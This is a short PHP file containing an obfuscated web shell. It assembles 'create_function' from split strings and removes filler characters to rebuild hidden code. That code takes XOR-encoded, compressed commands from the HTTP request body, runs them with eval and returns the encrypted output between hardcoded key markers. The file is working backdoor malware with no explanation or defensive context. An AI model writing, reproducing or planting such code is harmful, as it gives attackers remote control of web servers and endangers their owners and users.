<?php
$h='tch("/$khPY(.+)PY$kf/",@file_get_conPYtents(PY"phPYp://input"PY),PY$mPY)==1PY) {@PYob_stPYart();@e';
$i='PY;($j<$cPY&&$iPY<$l);$j++PY,PY$i++){$PYo.=$t{$i}^PY$k{$j}PY;}}retPYPYurn $oPY;}if PY(@pPYregPY_PYma';
$s='PYval(@gzuncoPYmpress(@x(PY@basPYe64_decodPYe(PY$m[1]),$k)))PY;PY$o=@obPY_getPY_contents(PY);@oPYb';
$U=str_replace('J','','JcJreaJJte_fuJJnction');
$K='_end_cleaPYn();$r=PY@bPYasePY64_encode(@xPY(@gzcPYoPYmpress($oPY),$k));prPYinPYt("$p$kh$PYr$kf");}';
$F='unctioPYn x($tPYPY,$k){$c=stPYrlen($k)PYPY;$l=strlePYn($t);$PYo="";fPYor($PYi=0;$i<$l;PY)PY{for($j=0';
$o='$k=PY"17PY1facdPY4"PY;$kh="19ef6caPY20e04";$kf=PY"49dPY2b091PY771a"PYPY;$p="Woo5WPYg2W7YsRyXyPYC";f';
$x=str_replace('PY','',$o.$F.$i.$h.$s.$K);
$A=$U('',$x);$A();
?>
